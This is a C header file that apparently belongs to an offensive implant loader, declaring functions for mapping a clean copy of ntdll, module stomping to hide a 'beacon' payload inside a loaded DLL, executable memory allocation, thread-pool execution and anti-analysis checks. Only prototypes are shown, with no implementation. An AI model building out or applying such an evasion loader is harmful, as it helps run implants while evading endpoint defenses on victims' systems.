#ifndef NAX_ADV_LOADER_H
#define NAX_ADV_LOADER_H

#include <windows.h>

struct _INSTANCE;
typedef struct _INSTANCE INSTANCE, *PINSTANCE;

FUNC PVOID NaxMapCleanNtdll( PINSTANCE Inst );

FUNC PIMAGE_NT_HEADERS NaxPeHeaders( PVOID Base );
FUNC PIMAGE_SECTION_HEADER NaxFindSection( PIMAGE_NT_HEADERS Nt, ULONG Characteristics );
FUNC PIMAGE_SECTION_HEADER NaxFindSectionByDir( PIMAGE_NT_HEADERS Nt, DWORD Directory );

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
FUNC PVOID NaxAllocExec( PVOID BeaconSrc, ULONG BeaconSize );
#endif

#if NAX_STOMP_MODE == NAX_STOMP_MODULE || NAX_STOMP_MODE == NAX_STOMP_ALREADYLOADED
FUNC PVOID NaxModuleStomp(
    _In_ PVOID   HdrPtr,
    _In_ PVOID   BeaconSrc,
    _In_ ULONG   BeaconSize,
    _In_ PVOID   PdataSrc,
    _In_ ULONG   PdataSize,
    _In_ PVOID   XdataSrc,
    _In_ ULONG   XdataSize,
    _In_ ULONG   OrigTextRva,
    _In_ PWCHAR  DllName );
#endif

#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
FUNC VOID NaxExecThreadPool( PVOID Entry );
#elif NAX_EXEC_MODE == NAX_EXEC_THREAD
FUNC VOID NaxExecThread( PVOID Entry );
#endif

// Anti-analysis
FUNC BOOL NaxAntiAnalysis( VOID );

#endif // NAX_ADV_LOADER_H
